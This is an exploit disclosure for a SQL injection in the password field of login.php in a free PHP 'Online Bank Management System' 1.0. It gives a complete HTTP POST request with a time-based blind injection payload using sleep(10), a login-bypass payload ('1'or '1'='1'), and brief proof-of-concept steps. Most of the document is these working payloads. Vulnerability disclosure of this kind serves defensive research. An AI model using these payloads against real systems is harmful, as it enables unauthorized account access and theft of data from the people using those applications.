# Online Bank Management System - login.php 'password' SQL inject

#### Exploit Title: Online Bank Management System - login.php 'password' SQL inject

#### Exploit Author: [webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc

#### Vendor Homepage: https://www.sourcecodester.com/php/15373/online-banking-management-system-php-free-source-code.html

#### Software Link:https://www.sourcecodester.com/download-code?nid=15373&title=Online+Bank+Management+System+in+PHP+Free+Source+Code

#### Version: Online Bank Management System 1.0

#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description

The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Online Bank Management System does not filter the content correctly at the "login.php/password" parameter, resulting in the generation of SQL injection.

#### Payload used:

```POST /login.php HTTP/1.1
Host: 192.168.67.14:8089
Content-Length: 95
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.67.14:8089
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.67.14:8089/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

email=manager%40manager.com&password=1'and 1=2 union select 1,sleep(10),3,4,5 --+&managerLogin=
```

#### Proof of Concept

1、Grab the package at the login and find that the login program is in login php

2、Looking at the source code, it is found that the password field is directly brought into the SQL statement query without filtering

![source-code](D:\cves\php-bank\images\source-code.png)

3、Use payload "sleep (10)" for blind SQL injection.It is found that the time blind injection is successful

![result1](D:\cves\php-bank\images\result1.png)

4、We can also construct a payload for universal password login

payload:`email=manager%40manager.com&password=1'or '1'='1&managerLogin=`

![passlogin](D:\cves\php-bank\images\passlogin.png)